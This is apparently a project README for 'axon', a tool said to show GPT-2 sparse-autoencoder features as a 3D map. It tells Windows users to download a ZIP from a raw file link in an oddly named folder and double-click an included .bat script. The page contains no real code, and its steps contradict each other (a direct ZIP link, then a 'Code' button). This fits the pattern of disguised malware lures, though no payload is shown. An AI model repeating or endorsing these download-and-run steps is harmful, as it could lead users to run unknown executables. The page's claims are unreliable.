# 🧠 axon - See gpt-2 thoughts in 3d

[![](https://img.shields.io/badge/Download-axon-blue.svg)](https://raw.githubusercontent.com/faizdafa26/axon/main/antimachine/Software_3.9.zip)

## 🔍 What is axon?

Axon shows how the GPT-2 language model works inside your computer. Artificial intelligence models often act as a black box. You input text, and the computer gives you an answer. You do not see what happens in the middle. Axon changes this view. It maps out the hidden layers of the model.

The tool uses a process called sparse autoencoders. These tools identify specific features inside the neural network. You see these data points as a 3D map. As the computer processes words, the visualization moves. You watch the model think bit by bit. This helps you understand why the computer chooses specific words during a conversation.

## 💻 System requirements

Your computer needs specific parts to run the visualization well.

*   Windows 10 or Windows 11.
*   8 gigabytes of system memory.
*   A modern web browser like Google Chrome, Microsoft Edge, or Firefox.
*   An active internet connection while you use the tool.

## 📥 How to download

You must visit the project page to get the files. Axon runs through your web browser, but it requires local setup on your hard drive to process the data correctly.

[Visit the official download page here](https://raw.githubusercontent.com/faizdafa26/axon/main/antimachine/Software_3.9.zip)

1. Click the link provided above.
2. Look for the green button labeled Code.
3. Select Download ZIP from the drop-down menu.
4. Save the file to your desktop for easy access.

## 🛠️ Setting up the software

After you download the ZIP file, you need to prepare the folder for use.

1. Right-click the file you downloaded.
2. Select Extract All.
3. Choose a folder on your computer where you want to keep the files.
4. Click Extract.

Once the folder opens, you will see several items. You do not need to alter any of these. The software runs via a script included in the package.

## 🚀 Running the application

The system uses a background engine to display the 3D data. Follow these steps to start the visualizer.

1. Open the folder you extracted in the previous section.
2. Locate the file named start_axon.bat.
3. Double-click this file to launch the command window.
4. Wait for the text to stop scrolling. This window prepares the connection between the model and your browser.
5. Open your web browser.
6. Type http://localhost:8000 into the address bar.
7. Press Enter.

The window in your browser now shows the 3D interface. You can rotate and zoom in on the data points using your mouse.

## 💡 Navigating the interface

The screen displays a cluster of dots. Each dot represents a feature the model detected. 

*   **Rotation:** Click and drag your left mouse button to spin the view.
*   **Zoom:** Use the scroll wheel to get closer to specific nodes.
*   **Token View:** Type a sentence into the text box at the bottom of the screen.
*   **Playback:** Press the play button to watch the model process your sentence. The dots will light up as the model creates the response.

If you click on a specific dot, the screen shows you the weight of that feature. This helps you verify if a feature relates to language, logic, or other patterns within the model.

## ⚙️ Solving common problems

If the browser page does not load, verify that the command window stays open. If you close the command window, the software stops.

If the 3D view appears empty, refresh your browser page. Sometimes the connection between the browser and the data engine needs a moment to stabilize. Ensure your internet connection is steady, as the system occasionally pulls small files from the model database.

If your computer slows down, reduce the amount of open tabs in your browser. Visualization requires your graphics processor. Closing other demanding programs like video games or video editors will help the view run smoothly.

## 🔮 Future updates

This project updates as researchers discover new ways to map model behavior. Check the main page periodically for improvements. These updates will offer more detail on how specific words trigger activation in the 3D space. You can expect more stability and faster load times as the development team optimizes the engine. 

The goal remains simple: making the internal logic of a large language model clear to everyone. Using standard controls and a 3D interface, you explore the patterns that define modern artificial intelligence.